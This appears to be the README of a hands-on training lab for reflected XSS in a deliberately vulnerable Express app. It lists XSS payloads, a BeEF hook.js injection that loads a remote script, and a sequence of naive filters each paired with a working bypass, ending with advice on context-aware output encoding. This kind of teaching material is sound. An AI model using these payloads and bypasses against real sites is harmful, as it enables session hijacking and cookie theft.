# Hands-on Express XSS Reflected

## Set up

### Deploy on Heroku

[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/0xdbe/Hands-on-Express-XSS-Reflected)

### Install locally

* Install nodejs

* Install dependencies

```console
$ npm install
```

* run application

```console
$ npm start
```

* Make sure that TCP/3000 is allowed on your firewall

* Open http://localhost:3000


## Hack

Having fun with XSS attacks such as:


- Using ``<script>`` tag

````
<script>alert("test")</script>
````

- using ``<iframe>`` tag with ``javascript`` URI scheme

````
<iframe src="javascript:alert('XSS');">
<iframe src="javascript:alert(`XSS`)">
````

- Using DOM event

````
<img src=1 href=1 onerror="javascript:alert('XSS')"></img>
<svg onload=alert(1)>
````

## Malicious hack

- Steal cookie

````
<script>alert(document.cookie)</script>
````

- Insert hook.js script from beef

````
<img src=1 href=1 onerror="javascript: (function () { var url = 'http://127.0.0.1:4000/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();" />
````

## Fix

Try to fix vulnerability and prevent XSS Attacks

Business requirement: you must keep ``<`` and ``>``.

### Round 1

- Payload

````
<script>alert("test")</script>
````

- Fix: add filter in ``src/routes/result.js``

````
search = search.replace("<script>", "");
````

### Round 2

- Bypass

````
<sc<script>ript>alert("test")</script>
````

- Fix: add filter (but it's not recursive)

````
search = search.replace(/<script>/g, "");
````

### Round 3

- Bypass

````
<sc<script>riPt>alert("test")</script>
````

- Fix with a recursive Filter

````
while (search != (search = search.replace(/<script>/g, "")));
````

### Round 4

- Bypass

````
<sC<script>riPt>alert("test")</script>
````

- Recursive and case insentive filter

````
while (search != (search = search.replace(/<script>/i, "")));
````

### Round 5

- Bypass (Add a single space)

````
<sC<script>riPt >alert("test")</script>
````

- Fix: remplace special char by html entities

````
search = search.replace(/</g, "&lt;");
search = search.replace(/\>/g, "&gt;");
````

### Round 6

- Bypass using HTML decimal entity

````
<img src=x onerror="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41">
````

- Bypass using JS encoding

````
<img src="x" onerror="\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006C\u0065\u0072\u0074('XSS')">
````

## Take away

solution: output encoding (aka escaping) but according a context (html, js, css, ...)
